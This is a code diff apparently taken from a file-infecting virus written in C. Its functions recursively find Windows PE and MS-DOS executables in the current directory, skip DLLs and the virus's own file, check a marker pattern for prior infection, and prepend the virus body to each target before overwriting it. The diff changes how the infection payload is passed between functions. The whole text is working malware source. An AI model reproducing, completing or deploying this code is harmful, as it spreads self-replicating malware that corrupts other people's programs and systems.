@@ -12,49 +12,28 @@
 
 #include "infection.h"
 
-int			pack_executables(char **result, char *prefix, int prefix_len, char *suffix, int suffix_len)
-{
-	char	pattern[] = { PATTERN };
-	int		total_len = prefix_len + suffix_len + sizeof(pattern);
-	char	*new_exe = NULL;
-
-	if ((new_exe = (char *)malloc(sizeof(char) * total_len)) == NULL)
-		return 0;
-	memcpy(new_exe									, prefix		, prefix_len);
-	memcpy(new_exe + prefix_len						, (char*)pattern, sizeof(pattern));
-	memcpy(new_exe + prefix_len + sizeof(pattern)	, suffix		, suffix_len);
-	*result = new_exe;
-	return (total_len);
-}
-
 /*
 ** Infect windows Portable executable
 */
-void		infect_pe_file(char *argv, IMAGE_DOS *img) {
-	char	*infection_content = NULL;
-	int		infection_size = 0;
-
+void		infect_pe_file(char *argv, IMAGE_DOS *img, char *infection_content, int infection_size) {
 	if (is_pe_x64(img->pe_header) == false)
 		return ;
-	if (strcmp(file_base_name(img->name), file_base_name(argv)) == 0)
+	if (img->pe_header->FileHeader.Characteristics & IMAGE_FILE_DLL)
 		return ;
 	if (find_pattern(img->buffer, img->len) != -1)//is file infected
 	{
-		printf("File \"%s\" is already infected\n", img->name);
-		return ;
-	}
-	if ((infection_size = windows_file_get_contents_size(&infection_content, argv)) <= 0) {
+		printf("File \"%s\" is already infected (%d)\n", img->name, img->pe_header->FileHeader.Characteristics);
 		return ;
 	}
 	img->new_buffer_len = pack_executables(&img->new_buffer, infection_content, infection_size, img->buffer, img->len);
-	printf("File \"%s\" infected\n", img->name);
+	printf("File \"%s\" infected (%d)\n", img->name, img->pe_header->FileHeader.Characteristics);
 	windows_file_put_contents_size(img->name, img->new_buffer, img->new_buffer_len);
 }
 
 /*
 ** Infect MS-DOS executable
 */
-void		infect_dos_file(char *argv, IMAGE_DOS *img) {
+void		infect_dos_file(char *argv, IMAGE_DOS *img, char *infection_content, int infection_size) {
 	if (img->len < sizeof(struct _IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS)) {
 		return ;
 	}
@@ -62,7 +41,7 @@ void		infect_dos_file(char *argv, IMAGE_DOS *img) {
 	img->pe_header = (IMAGE_NT_HEADERS*)(img->buffer + img->dos_header->e_lfanew);
 	if (is_pe_signature(img->pe_header))
 	{
-		infect_pe_file(argv, img);
+		infect_pe_file(argv, img, infection_content, infection_size);
 	}
 	free(img);
 }
@@ -70,7 +49,7 @@ void		infect_dos_file(char *argv, IMAGE_DOS *img) {
 /*
 ** Infect PE or MS-DOS windows files
 */
-void		infect_file(char *argv, char *file_path) {
+void		infect_file(char *argv, char *file_path, char *infection_content, int infection_size) {
 	char	*file = NULL;
 	size_t	size = windows_file_get_contents_size(&file, file_path);
 	int		file_type = get_windows_binary_type(file);
@@ -83,20 +62,22 @@ void		infect_file(char *argv, char *file_path) {
 		img->buffer = file;
 		img->len = size;
 		img->name = file_path;
-		infect_dos_file(argv, img);
+		infect_dos_file(argv, img, infection_content, infection_size);
 	}
 }
 
 /*
 ** Infect with recursivity all Windows binary files (PE, MS-DOS)
 */
-void		infect(char *argv) {
+void		infect(char *argv, char *infection_content, int infection_size) {
 	char **files = NULL;
 
 	files = get_files_types(files, ".", is_windows_binary_file);
 
 	for (int i = 0; files[i]; i++) {
-		infect_file(argv, files[i]);
+		if (strcmp(file_base_name(files[i]), file_base_name(argv)) == 0)
+			continue ;
+		infect_file(argv, files[i], infection_content, infection_size);
 	}
 	free_array(files);
 }
